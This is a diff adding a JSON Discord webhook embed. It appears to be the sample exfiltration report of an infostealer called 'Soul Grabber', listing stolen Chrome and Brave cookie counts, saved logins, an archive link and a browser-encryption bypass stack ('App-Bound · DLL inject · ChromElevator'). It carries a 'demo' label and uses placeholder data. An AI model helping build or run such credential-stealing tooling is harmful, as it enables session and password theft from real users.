@@ -1,0 +1,41 @@
+{
+  "username": "Soul Grabber",
+  "embeds": [
+    {
+      "title": "?? Browser Session — Educational Demo",
+      "description": "Fictional capture summary for **defensive research**. No real victim data.",
+      "color": 3447003,
+      "fields": [
+        {
+          "name": "??? Host",
+          "value": "`DESKTOP-DEMO` · Windows 11 · en-US",
+          "inline": false
+        },
+        {
+          "name": "?? Cookies",
+          "value": "Chrome · 142 importable / 142 v20\nBrave · 200 importable / 200 v20",
+          "inline": false
+        },
+        {
+          "name": "?? Passwords",
+          "value": "2 logins (demo)",
+          "inline": true
+        },
+        {
+          "name": "?? Archive",
+          "value": "[cookies.json + README.txt](https://example.com/educational-demo-only.zip)",
+          "inline": true
+        },
+        {
+          "name": "??? v20 stack",
+          "value": "App-Bound · DLL inject · ChromElevator fallback",
+          "inline": false
+        }
+      ],
+      "footer": {
+        "text": "Soul Grabber · educational purposes only"
+      },
+      "timestamp": "2026-08-03T18:05:00.000Z"
+    }
+  ]
+}
